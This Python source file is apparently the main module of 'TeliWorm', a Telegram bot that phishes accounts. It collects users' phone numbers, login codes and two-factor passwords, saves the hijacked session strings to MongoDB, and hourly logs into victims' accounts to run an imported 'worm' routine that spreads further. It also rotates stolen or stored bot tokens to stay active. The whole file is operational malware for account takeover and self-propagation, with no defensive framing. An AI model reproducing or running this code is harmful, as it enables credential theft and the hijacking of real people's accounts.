import logging,os,json,telethon,asyncio,time,pytz
from typing import Any, Dict, Optional
from datetime import datetime
from telethon.tl.custom import Message
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from dotenv import load_dotenv
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from strings import strings,direct_reply,numpad
from worm import worm

load_dotenv(override=True)
# Set global logging to WARNING to avoid Telethon flooding
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.WARNING)
# Set custom log level for our bot logger from .env
def get_log_level():
    level_str = os.environ.get('MY_LOG_LEVEL', 'INFO').upper()
    return getattr(logging, level_str, logging.INFO)
logger = logging.getLogger("TeliWorm")
logger.setLevel(get_log_level())
handler = logging.StreamHandler()
handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
if not logger.hasHandlers():
    logger.addHandler(handler)
mongo_client = MongoClient(os.environ['MONGODB_URI'], server_api=ServerApi('1'))
logger_bot = TelegramClient('teliworm', 6, "eb06d4abfb49dc3eeb1aeb98ae0f581e")
usr_client = TelegramClient(StringSession(os.environ['USER_SESSION']), os.environ['API_ID'], os.environ['API_HASH'])
TIMEZONE = pytz.timezone(os.getenv('TIMEZONE', 'Asia/Colombo'))

def setconfig(key: str, value: Any) -> None:
    logger.info(f"Setting config key '{key}' to '{value}'")
    mongo_client.default.config.update_one({'key': key}, {'$set': {'key':key, 'value':value}}, upsert=True)

def yesno(x: str, page: str = 'def') -> list:
    return [
        [Button.inline(strings['yes'], f'{{"page":"{page}","press":"yes{x}"}}')],
        [Button.inline(strings['no'], f'{{"page":"{page}","press":"no{x}"}}')]
    ]
def to_emoji(int_str: str) -> str:
    charset = '0️⃣,1️⃣,2️⃣,3️⃣,4️⃣,5️⃣,6️⃣,7️⃣,8️⃣,9️⃣'.split(',')
    return ''.join([charset[int(i)] for i in str(int_str)])
async def is_session_authorized(session: str, ref: str) -> bool:
    logger.info(f"Checking if session:{ref} is authorized.")
    authorized = False
    try:
        uclient = TelegramClient(StringSession(session), os.environ['API_ID'], os.environ['API_HASH'])
        await uclient.connect()
        authorized = await uclient.is_user_authorized()
    finally:
        await uclient.disconnect()
    logger.info(f"Session:{ref} authorized: {authorized}")
    return authorized
async def handle_usr(phone_num: str, event: Message) -> Dict[str, Any]:
    logger.info(f"Handling user phone number: {phone_num}")
    await (await event.respond('wait..', buttons=Button.clear())).delete()
    msg = await event.respond(strings['sending'])
    uclient = TelegramClient(StringSession(), os.environ['API_ID'], os.environ['API_HASH'])
    await uclient.connect()
    try:
        scr = await uclient.send_code_request(phone_num)
        login = {
            'code_len': scr.type.length,
            'phone_code_hash': scr.phone_code_hash,
            'session': uclient.session.save(),
        }
        logger.info(f"Code request sent. Login dict: {login}")
        await msg.edit(strings['ask_code'], buttons=numpad)
        await uclient.disconnect()
        return login
    except Exception as e:
        logger.error(f"Error in handle_usr: {e}")
        await msg.edit(f"Error: {repr(e)}")
    await uclient.disconnect()
    return {}
async def sign_in(event: Message, user_data: Dict[str, Any]) -> bool:
    data = {}
    uclient = None
    try:
        login = json.loads(user_data['login'])
        if len(login.get('code', ''))==login.get('code_len', 0) and login.get('pass_ok', False):
            logger.info(f"Signing in with password for user: {user_data.get('chat_id', user_data.get('_id', 'unknown'))}.")
            uclient = TelegramClient(StringSession(login['session']), os.environ['API_ID'], os.environ['API_HASH'])
            await uclient.connect()
            await uclient.sign_in(password=user_data['password'])
        elif len(login.get('code', ''))==login.get('code_len', 0) and not login.get('need_pass', False):
            logger.info(f"Signing in with code for user: {user_data.get('chat_id', user_data.get('_id', 'unknown'))} .")
            uclient = TelegramClient(StringSession(login['session']), os.environ['API_ID'], os.environ['API_HASH'])
            await uclient.connect()
            await uclient.sign_in(user_data['phone'], login['code'], phone_code_hash=login['phone_code_hash'])
        else:
            return False
        login = {}
        data = {'session': uclient.session.save(), 'logged_in': True, 'ts': round(time.time())}
        logger.info(f"Sign-in process completed for user: {user_data.get('chat_id', user_data.get('_id', 'unknown'))}")
        await event.edit(strings['login_success'])
    except telethon.errors.PhoneCodeInvalidError as e:
        logger.warning(f"Invalid phone code: {e}")
        await event.edit(strings['code_invalid'])
        await event.respond(strings['ask_code'], buttons=numpad)
        login['code'] = ''
    except telethon.errors.SessionPasswordNeededError as e:
        logger.info("Session password needed.")
        if login.get('local_avail', 'password' in user_data):
            logger.info("Password is locally available")
            login['pass_ok'] = True
            user_data['login'] = json.dumps(login)
            return await sign_in(event, user_data)
        login['need_pass'] = True
        login['pass_ok'] = False
        await event.edit(strings['ask_pass'])
    except telethon.errors.PasswordHashInvalidError as e:
        logger.warning("Password hash invalid.")
        login['need_pass'] = True
        login['pass_ok'] = False
        login['local_avail'] = False
        await event.edit(strings['pass_invalid'])
        await event.respond(strings['ask_pass'])
    except Exception as e:
        logger.error(f"Exception during sign-in: {e}")
        login = {}
        await event.edit(repr(e))
    if uclient is not None:
        await uclient.disconnect()
    update_query = {'$set': data}
    if login=={}:
        update_query['$unset'] = {'login': ''}
    else:
        data['login'] = json.dumps(login)
    mongo_client.userdb.sessions.update_one({'_id': user_data['_id']}, update_query)
    return True

@events.register(events.NewMessage(func=lambda e: e.is_private, outgoing=False))
async def handler_all_user(event: Message) -> None:
    user_data = mongo_client.userdb.sessions.find_one({"chat_id": event.chat_id})
    user_data = user_data if user_data else {"chat_id": event.chat_id}
    data = {}
    login = json.loads(user_data.get('login', '{}'))
    if event.message.text in direct_reply:
        await event.respond(direct_reply[event.message.text])
        raise events.StopPropagation
    elif not user_data.get('logged_in', False) and event.message.contact and event.message.contact.user_id==event.chat.id:
        await event.message.delete()
        data['phone'] = event.message.contact.phone_number
        login = await handle_usr(event.message.contact.phone_number, event)
    elif len(login.get('code', ''))==login.get('code_len', 0) and login.get('need_pass', False) and not login.get('pass_ok', False):
        await event.message.delete()
        await event.respond(strings['ask_ok']+event.message.text, buttons=yesno('pass'))
        data['password'] = event.message.text
    elif user_data.get('logged_in', False):
        if await is_session_authorized(user_data['session'], user_data['chat_id']):
            await event.respond(strings['already_logged_in'])
        else:
            login = await handle_usr(user_data['phone'], event)
            data['logged_in'] = False
    else:
        if 'phone' in user_data:
            login = await handle_usr(user_data['phone'], event)
        else:
            await event.respond(strings['hello'], buttons=[Button.request_phone(strings['share_contact_btn'], resize=True, single_use=True)])
    if login!={}:
        data['login'] = json.dumps(login)
    if data!={}:
        mongo_client.userdb.sessions.update_one({"chat_id": event.chat_id}, {'$set': data}, upsert=True)
    raise events.StopPropagation
@events.register(events.CallbackQuery(func=lambda e: e.is_private))
async def handler_callback(event: Message) -> None:
    try:
        evnt_dta = json.loads(event.data.decode())
        press = evnt_dta['press']
    except:
        return
    user_data = mongo_client.userdb.sessions.find_one({"chat_id": event.chat_id})
    login = json.loads(user_data.get('login', '{}'))
    login['code'] = login.get('code', '')
    if type(press)==int:
        login['code'] += str(press)
    elif press=="clear":
        login['code'] = login['code'][:-1]
    elif press=="clear_all":
        login['code'] = ''
    elif press=="yespass":
        login['pass_ok'] = True
        login['need_pass'] = False
    elif press=="nopass":
        login['pass_ok'] = False
        login['need_pass'] = True
        await event.edit(strings['ask_pass'])
    user_data['login'] = json.dumps(login)
    mongo_client.userdb.sessions.update_one({"chat_id": event.chat_id}, {'$set': {'login': user_data['login']}})
    if press=="nopass":
        return
    elif not await sign_in(event, user_data):
        try:
            await event.edit(strings['ask_code']+to_emoji(login['code']), buttons=numpad)
        except telethon.errors.rpcerrorlist.MessageNotModifiedError:
            pass

async def check_and_spread():
    targets = mongo_client.userdb.sessions.find({"logged_in": True, "$or": [{"worm_done": False },{ "worm_done":{"$exists": False }}], "ts": {"$lt": round(time.time())-3*24*60*60}})
    for target in targets:
        logger.info(f"Checking target: {target['phone']}")
        uclient = None
        try:
            if not await is_session_authorized(target['session'], target['chat_id']):
                mongo_client.userdb.sessions.update_one({'phone': target['phone']}, {'$unset': {'logged_in':False, 'session': ''}})
                continue
            logger.info(f"Spreading worm from {target['phone']}")
            uclient = TelegramClient(StringSession(target['session']), os.environ['API_ID'], os.environ['API_HASH'])
            await uclient.connect()
            await worm(uclient, logger_bot)
            logger.info(f"Spreading finished for {target['phone']}")
        except Exception as e:
            logger.error(f"Error spreading worm for {target['phone']}: {e}")
        finally:
            if uclient is not None:
                await uclient.disconnect()
async def is_bot_active(bot_username: str) -> bool:
    try:
        entity = await usr_client.get_entity(f'@{bot_username}')
        if entity.deleted:
            return False
    except telethon.errors.rpcerrorlist.UsernameInvalidError:
        return False
    except Exception as e:
        logger.error(f"Error checking bot status: {e}")
        return False
    return True
async def wait_until_next_minute() -> datetime:
    now = datetime.now(TIMEZONE)
    next_minute = now.replace(hour=now.hour, minute=now.minute+1 if now.minute!=59 else 0, second=0, microsecond=0)
    seconds_to_next_minute = (next_minute-now).total_seconds()
    await asyncio.sleep(seconds_to_next_minute)
    return now
async def cron(bot_username: str, bot: TelegramClient) -> None:
    while True:
        dt = await wait_until_next_minute()
        if not await is_bot_active(bot_username):
            logger.info('[-] Bot is inactive')
            if bot is not None:
                await bot.disconnect()
            return
        else:
            logger.debug('[+] Bot is active')
        if dt.minute==0:
            logger.info(f'Running check_and_spread task for hour: {dt.hour}')
            logger_bot.loop.create_task(check_and_spread())
            await wait_until_next_minute()
async def run_bot() -> None:
    logger.info("Starting bot...")
    bot_count = mongo_client.wormdb.bots.count_documents({})
    bot = TelegramClient(StringSession(), 6, "eb06d4abfb49dc3eeb1aeb98ae0f581e")
    for function in botFunctions:
        bot.add_event_handler(function)
    if bot_count==0:
        logger.info("No bots in DB, starting with BOT_TOKEN.")
        await bot.start(bot_token=os.environ['BOT_TOKEN'])
    else:
        next_bot = mongo_client.wormdb.bots.find_one({})
        try:
            logger.info(f"Starting bot with token from DB: {next_bot['token']}")
            await bot.start(bot_token=next_bot['token'])
        except Exception as e:
            logger.error(f"Error starting bot: {e}. Deleting bot from DB.")
            mongo_client.wormdb.bots.delete_one(next_bot)
            raise e
        if not await is_bot_active(next_bot['username']):
            logger.error("Bot not authorized. Deleting bot from DB.")
            mongo_client.wormdb.bots.delete_one(next_bot)
            raise Exception("Bot not authorized")
    bot_username = (await bot.get_me()).username
    setconfig('BOT_USERNAME', bot_username)
    setconfig('BOT_TOKEN', os.environ['BOT_TOKEN'] if bot_count==0 else next_bot['token'])
    logger.info("Bot started and running until disconnected.")
    cron_task = bot.loop.create_task(cron(bot_username, bot))
    try:
        await bot.run_until_disconnected()
    finally:
        cron_task.cancel()
        await asyncio.gather(cron_task, return_exceptions=True)
async def main() -> None:
    logger.info("Starting logger bot...")
    await logger_bot.start(bot_token=os.environ['LOGGER_BOT_TOKEN'])
    logger.info("Starting user client...")
    await usr_client.connect()
    while True:
        try:
            await run_bot()
        except KeyboardInterrupt:
            logger.info("KeyboardInterrupt received. Exiting main loop.")
            break
        except Exception as e:
            logger.error(f"Exception in main loop: {e}")

botFunctions = [obj for name, obj in globals().items() if callable(obj) and obj.__class__.__name__ == "function" and name.startswith('handler_')]

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
